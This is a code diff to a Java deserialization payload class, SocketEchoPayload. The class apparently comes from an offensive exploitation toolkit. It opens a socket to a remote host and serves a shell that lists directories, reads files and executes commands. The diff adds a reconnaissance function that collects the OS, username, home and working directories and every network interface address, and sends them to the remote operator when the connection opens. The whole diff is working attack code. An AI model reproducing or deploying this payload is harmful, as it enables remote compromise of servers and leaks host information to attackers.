@@ -12,6 +12,7 @@ import java.net.Socket;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 
+
 /**
  * @author wh1t3P1g
  * @since 2021/6/16
@@ -60,6 +61,29 @@ public class SocketEchoPayload extends AbstractTranslet implements Serializable,
         String line2 = null;
         while ((line2 = read.readLine()) != null) {
             stringBuilder.append(line2).append("\n");
+        }
+        return stringBuilder.toString();
+    }
+
+    public String info() throws IOException {
+        StringBuilder stringBuilder = new StringBuilder();
+        String os = System.getProperty("os.name");
+        stringBuilder.append("os: ").append(os).append("\n");
+        String username = System.getProperty("user.name");
+        stringBuilder.append("whoami: ").append(username).append("\n");
+        String home = System.getProperty("user.home");
+        stringBuilder.append("home: ").append(home).append("\n");
+        String dir = System.getProperty("user.dir");
+        stringBuilder.append("dir: ").append(dir).append("\n");
+        stringBuilder.append("newtork: ").append("\n");
+        java.util.Enumeration<java.net.NetworkInterface> nifs = java.net.NetworkInterface.getNetworkInterfaces();
+        while (nifs.hasMoreElements()) {
+            java.net.NetworkInterface nif = nifs.nextElement();
+            java.util.Enumeration<java.net.InetAddress> addresses = nif.getInetAddresses();
+            while (addresses.hasMoreElements()) {
+                java.net.InetAddress addr = addresses.nextElement();
+                stringBuilder.append("address: ").append(addr.getHostAddress()).append(", interface: ").append(nif.getName()).append("\n");
+            }
         }
         return stringBuilder.toString();
     }
@@ -118,7 +142,10 @@ public class SocketEchoPayload extends AbstractTranslet implements Serializable,
             Socket socket = new Socket(host, port);
             BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
             bufferedWriter.write("happy everyday!\n");
-            bufferedWriter.write("help: list [dir] | read [file] | exec [cmd]\n");
+            bufferedWriter.write("\n");
+            bufferedWriter.write(info());
+            bufferedWriter.write("\n");
+            bufferedWriter.write("help: info | list [dir] | read [file] | exec [cmd]\n");
             bufferedWriter.flush();
 
             BufferedReader bufferedReader = new BufferedReader(
@@ -142,6 +169,8 @@ public class SocketEchoPayload extends AbstractTranslet implements Serializable,
                     }else if(line.startsWith("exec")){
                         String command = line.substring(5);
                         result.append(exec(command));
+                    }else if(line.startsWith("info")){
+                        result.append(info());
                     }
                     result.append(sepE);
                     bufferedWriter.write(result.toString());
